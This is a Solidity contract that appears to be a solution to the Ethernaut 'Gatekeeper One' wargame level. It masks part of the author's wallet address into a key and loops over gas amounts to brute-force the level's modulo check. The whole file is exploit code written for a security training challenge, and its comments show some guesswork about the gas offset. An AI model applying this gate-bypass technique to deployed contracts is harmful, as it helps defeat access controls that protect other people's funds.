pragma solidity ^0.8.0;

import './Gatekeeperone.sol';


contract AreYouTheKeymaster{ //gate3 
    using SafeMath for uint256; 
    bytes8 txOrigin16 = 0x59Fe459D6D8f30F5; //last 16 digits of your account 0x| F6eA8E869C68362eC2FA1b21 | 59Fe459D6D8f30F5 (MetaMask)
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF; 
    GatekeeperOne public gkpOne;

 
    function setGatekeeperOne(address _addr) public{// psdd gate1
        gkpOne = GatekeeperOne(_addr);
    }
  

  //Gate2 > Brut force the gus options until the right value fits the modulo
  //spalladino >   https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol
    function letMeIn() public{ //gate 2 
         for (uint256 i = 0; i < 120; i++) {
         // Call "enter" function, with a lower level "call" method
         // ... this allows to control the specific amount of gas
         // ... loop to provide the right amount of gas 

         (bool result, bytes memory data) = address(gkpOne).call{gas:
         // 3 = gas cost for a PUSH opcode
         // 8191 = the modulo
         // 150 ????
         // i = iterator
          i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key)); // thanks to Spalladino https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol
         //if the response is "true" (e. g. modulo 0), then break,
         // if not, then continue through the loop 

      if(result)
        {
        break;
      }
    }
  }
        
    
}